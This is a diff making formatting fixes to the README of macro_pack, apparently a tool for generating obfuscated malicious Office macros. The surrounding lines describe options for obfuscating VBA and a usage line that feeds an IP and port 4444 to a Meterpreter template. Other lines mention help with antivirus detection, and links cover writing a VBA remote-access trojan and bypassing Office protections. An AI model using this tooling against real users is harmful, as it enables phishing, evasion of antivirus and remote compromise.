@@ -186,12 +186,12 @@ echo 192.168.0.5 4444 | macro_pack.exe -t METERPRETER -o -G "\\192.168.0.8\c$\us
     -f, --input-file=INPUT_FILE_PATH A VBA macro file or file containing params for --template option 
         If no input file is provided, input must be passed via stdin (using a pipe).
         
-    -q, --quiet \tDo not display anything on screen, just process request. 
+    -q, --quiet Do not display anything on screen, just process request. 
     
-    -o, --obfuscate \tSame as '--obfuscate-form --obfuscate-names --obfuscate-strings'
-    --obfuscate-form\tModify readability by removing all spaces and comments in VBA
-    --obfuscate-strings\tRandomly split strings and encode them
-    --obfuscate-names \tChange functions, variables, and constants names
+    -o, --obfuscate  Same as '--obfuscate-form --obfuscate-names --obfuscate-strings'
+    --obfuscate-form Modify readability by removing all spaces and comments in VBA
+    --obfuscate-strings Randomly split strings and encode them
+    --obfuscate-names   Change functions, variables, and constants names
       
     -s, --start-function=START_FUNCTION   Entry point of macro file 
         Note that macro_pack will automatically detect AutoOpen, Workbook_Open, or Document_Open  as the start function
@@ -328,7 +328,7 @@ If you have an issue with macro\_pack AV detection you can write to us for advic
 
 ## Relevant resources
 
-Blog post about MS Office security:
+Blog posts about MS Office security:
  - http://blog.sevagas.com/?My-VBA-Bot (write a full VBA RAT, includes how to bypass VBOM protection)
  - http://pwndizzle.blogspot.fr/2017/03/office-document-macros-ole-actions-dde.html
  - https://sensepost.com/blog/2017/macro-less-code-exec-in-msword/ (About Dynamic Data Exchange attacks)
